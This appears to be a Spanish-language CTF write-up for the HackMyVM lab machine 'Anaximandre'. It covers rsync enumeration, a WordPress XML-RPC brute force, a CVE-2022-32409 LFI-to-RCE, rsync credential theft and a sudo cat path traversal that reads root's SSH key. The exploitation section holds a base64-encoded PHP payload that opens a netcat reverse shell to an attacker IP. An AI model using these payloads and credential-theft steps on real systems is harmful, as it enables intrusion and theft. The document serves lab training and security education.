# Anaximandre — WriteUp

**Plataforma:** HackMyVM  
**Dificultad:** Media  
**Fecha de resolución:** 2026-05-06  
**Sistema:** Linux (Debian 11)  
**IP objetivo:** 192.168.0.17  

---

## Índice

1. [Reconocimiento](#reconocimiento)
2. [rsync — descarga de logs cifrados](#rsync--descarga-de-logs-cifrados)
3. [WordPress — enumeración y credenciales](#wordpress--enumeración-y-credenciales)
4. [Descifrado de logs — subdominio y LFI](#descifrado-de-logs--subdominio-y-lfi)
5. [lovegeografia — git expuesto y CVE-2022-32409 RCE](#lovegeografia--git-expuesto-y-cve-2022-32409-rce)
6. [Escalada a chaz — rsyncd.auth](#escalada-a-chaz--rsyncdauth)
7. [Escalada a root — sudo cat path traversal + id_rsa](#escalada-a-root--sudo-cat-path-traversal--id_rsa)
8. [Flags](#flags)
9. [Lecciones aprendidas y errores cometidos](#lecciones-aprendidas-y-errores-cometidos)

---

## Reconocimiento

### Descubrimiento de host

```bash
sudo arp-scan -l
```

> **Nota:** La VM inicialmente no respondió porque estaba conectada por WLAN en lugar de la interfaz de red esperada. Tras reiniciarla correctamente, apareció en la red con IP 192.168.0.17 (MAC VirtualBox).

Target identificado: **192.168.0.17**

### Escaneo de puertos

```bash
nmap -p- --min-rate 5000 -n -Pn 192.168.0.17
```

**Resultado:**

| Puerto | Servicio |
|--------|----------|
| 22/tcp | SSH |
| 80/tcp | HTTP (WordPress) |
| 873/tcp | **rsync** |

El puerto **873 (rsync)** es el vector inicial más interesante — suele estar mal configurado.

---

## rsync — Descarga de logs cifrados

### Enumeración del módulo rsync

```bash
rsync rsync://192.168.0.17/
```

Resultado: módulo **share_rsync** expuesto (sin autenticación).

```bash
rsync rsync://192.168.0.17/share_rsync/
```

```
-rw-r-----  67,719  access.log.cpt
-rw-r-----   4,206  auth.log.cpt
-rw-r-----  45,772  daemon.log.cpt
-rw-r--r-- 229,920  dpkg.log.cpt
-rw-r-----   4,593  error.log.cpt
-rw-r-----  90,768  kern.log.cpt
```

Archivos cifrados con `.cpt` (ccrypt). Los descargamos todos:

```bash
rsync -av rsync://192.168.0.17/share_rsync/ ./logs/
```

---

## WordPress — Enumeración y credenciales

### Descubrimiento del hostname

```bash
curl -I http://192.168.0.17
```

Cabecera `Link` revela: `http://anaximandre.hmv`

```bash
echo "192.168.0.17 anaximandre.hmv" | sudo tee -a /etc/hosts
```

### Enumeración con wpscan

```bash
wpscan --url http://anaximandre.hmv --enumerate u
```

**Hallazgos:**
- WordPress 6.1.1 (inseguro)
- XML-RPC habilitado → brute force sin lockout
- Usuarios: **admin**, **webmaster**

### Brute force por XML-RPC

```bash
wpscan --url http://anaximandre.hmv -U admin,webmaster -P /usr/share/wordlists/rockyou.txt --password-attack xmlrpc
```

**Credencial encontrada:** `webmaster:mickey`

### Panel WordPress — nota confidencial

Accediendo al panel con `webmaster:mickey`, en la sección de comentarios pendientes hay una nota privada del admin:

```
CONFIDENTIAL - NOT TO BE PUBLISHED
note to self: Yn89m1RFBJ
```

Esta cadena es la **clave ccrypt** para descifrar los logs.

---

## Descifrado de logs — Subdominio y LFI

### Instalación de ccrypt

```bash
sudo apt install ccrypt -y
```

### Descifrado de los logs

```bash
ccrypt -d -k <(echo "Yn89m1RFBJ") logs/auth.log.cpt
ccrypt -d -k <(echo "Yn89m1RFBJ") logs/error.log.cpt
ccrypt -d -k <(echo "Yn89m1RFBJ") logs/access.log.cpt
```

### auth.log — Usuario del sistema

```
Nov 26 16:16:07 debian useradd[16501]: new user: name=chaz, UID=1001
```

Usuario identificado: **chaz**

### error.log — Subdominio oculto

```
[client 192.168.0.29] PHP Notice: ... referer: http://lovegeografia.anaximandre.hmv/init/index.php
```

Subdominio descubierto: **lovegeografia.anaximandre.hmv**

```bash
echo "192.168.0.17 lovegeografia.anaximandre.hmv" | sudo tee -a /etc/hosts
```

### access.log — LFI confirmado

```
GET /exemplos/codemirror.php?&pagina=../../../../../../../../../etc/passwd HTTP/1.1" 200 982
```

El propio administrador de la máquina ya explotó esta vulnerabilidad en los logs.

---

## lovegeografia — git expuesto y CVE-2022-32409 RCE

### Directorio .git expuesto

```bash
gobuster dir -u http://lovegeografia.anaximandre.hmv -w /usr/share/wordlists/dirb/common.txt -x php -q
```

Encontrado: `.git/HEAD` (200) — repositorio git público.

### Descarga del repositorio

```bash
pip install git-dumper --break-system-packages
git-dumper http://lovegeografia.anaximandre.hmv/.git/ ./lovegeografia_git
```

### Análisis del código fuente — credenciales

```bash
grep -r "password\|passwd\|senha" ./lovegeografia_git/admin/php/conexaopostgresql.php
```

```php
$dbh = new PDO('pgsql:dbname=dbspo;user=postgres;password=postgres;host=localhost');
```

```bash
grep -i "master\|senha" ./lovegeografia_git/ms_configura.php
```

```php
$i3geomaster = array(array("usuario"=>"admin", "senha"=>"admin"));
```

### Verificación del LFI

```bash
curl -s "http://lovegeografia.anaximandre.hmv/exemplos/codemirror.php?pagina=../../../../../../../../../etc/passwd"
```

LFI confirmado — `/etc/passwd` visible.

### CVE-2022-32409 — RCE via data:// wrapper

El parámetro `pagina` acepta el wrapper `data://text/plain;base64`, permitiendo inyectar código PHP arbitrario.

```bash
echo -n "<?php system('nc -e /bin/bash 192.168.0.14 1234'); ?>" | base64
# PD9waHAgc3lzdGVtKCduYyAtZSAvYmluL2Jhc2ggMTkyLjE2OC4wLjE0IDEyMzQnKTsgPz4=
```

En Kali, listener:

```bash
nc -lvnp 1234
```

Petición de explotación:

```bash
curl -s "http://lovegeografia.anaximandre.hmv/exemplos/codemirror.php?pagina=data://text/plain;base64,PD9waHAgc3lzdGVtKCduYyAtZSAvYmluL2Jhc2ggMTkyLjE2OC4wLjE0IDEyMzQnKTsgPz4="
```

**Shell obtenida como `www-data`.**

Estabilización:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Escalada a chaz — rsyncd.auth

### wp-config.php — contraseña de BD

```bash
cat /var/www/html/wp-config.php
```

```php
define( 'DB_USER', 'admin' );
define( 'DB_PASSWORD', 'myw0rdpr355p455w0rd' );
```

No sirve para SSH ni para `su chaz`.

### rsyncd.auth — credenciales rsync

```bash
cat /etc/rsyncd.auth
```

```
chaz:alanamorrechazado
```

El archivo de autenticación de rsync almacena credenciales en texto claro.

```bash
ssh chaz@192.168.0.17
# password: alanamorrechazado
```

```bash
cat ~/user.txt
# d151c8ace0dbdd0ef23a3e3200f696f1
```

---

## Escalada a root — sudo cat path traversal + id_rsa

### sudo -l

```bash
sudo -l
```

```
(ALL : ALL) NOPASSWD: /usr/bin/cat /home/chaz/*
```

El wildcard `*` no está entre comillas → permite path traversal.

### Lectura de la clave privada de root

```bash
sudo /usr/bin/cat /home/chaz/../../../root/.ssh/id_rsa
```

Clave RSA privada obtenida. En Kali:

```bash
nano ~/root_key.pem   # pegar la clave
chmod 600 ~/root_key.pem
ssh -i ~/root_key.pem root@192.168.0.17
```

```bash
cat /root/root.txt
# a3cbb8984cf5f19086595c6a2f569786
```

---

## Flags

| Flag | Hash |
|------|------|
| **user.txt** | `d151c8ace0dbdd0ef23a3e3200f696f1` |
| **root.txt** | `a3cbb8984cf5f19086595c6a2f569786` |

---

## Lecciones aprendidas y errores cometidos

### Errores

| # | Error | Causa | Consecuencia | Solución |
|---|-------|-------|--------------|----------|
| 1 | VM no respondía al arp-scan inicial | Estaba conectada por WLAN, no por la interfaz correcta | Pérdida de tiempo buscando en IP incorrecta | Verificar interfaz de red de la VM antes de escanear |
| 2 | No descifrar el `access.log` desde el principio | Solo miramos `auth.log` y `error.log` por considerarlos más relevantes | El LFI estaba documentado en `access.log` desde el inicio | Cuando hay múltiples archivos de evidencia, revisarlos **todos** antes de seguir |
| 3 | Intentar SSH con `webmaster:mickey` | Credencial válida para WordPress, no para SSH | Tiempo perdido | Verificar en qué servicio aplica cada credencial |
| 4 | Intentar SSH con `chaz:Yn89m1RFBJ` | La clave ccrypt no es la contraseña del usuario | Tiempo perdido | La clave de cifrado y la contraseña de usuario son cosas distintas |
| 5 | hashcat con modo 7400 para yescrypt | Modo 7400 es sha256crypt (`$5$`), no yescrypt (`$y$`) | Hash no cargado | Usar john para yescrypt — lo detecta automáticamente |
| 6 | john tampoco cargó el hash | El hash incluía el prefijo `root:` sin `--format` explícito | Hash ignorado | Esta vía fue abandonada en favor de leer la clave SSH directamente |

### Conceptos clave

**rsync sin autenticación:**  
Un módulo rsync expuesto sin credenciales permite descargar (y potencialmente subir) archivos arbitrarios. Aquí contenía logs cifrados que a su vez contenían todas las pistas para comprometer la máquina.

**CVE-2022-32409 — i3geo codemirror.php:**  
El parámetro `pagina` incluye el contenido del archivo referenciado en la respuesta HTML. Al aceptar el wrapper `data://text/plain;base64`, permite inyectar código PHP arbitrario, convirtiendo el LFI en RCE sin necesidad de log poisoning ni file upload.

**sudo con wildcard sin entrecomillar:**  
`sudo /usr/bin/cat /home/chaz/*` permite path traversal hacia cualquier archivo del sistema porque el `*` es expandido por el shell antes de pasarlo a sudo. La restricción solo limita el comando, no la ruta resultante.

**rsyncd.auth en texto claro:**  
El archivo de autenticación de rsync almacena usuario:contraseña en texto plano. Si un atacante tiene acceso de lectura al sistema (como www-data), puede obtener credenciales de usuarios del sistema directamente.

---

*WriteUp elaborado con asistencia de Claude Code (CSIRT Team Leader mode)*
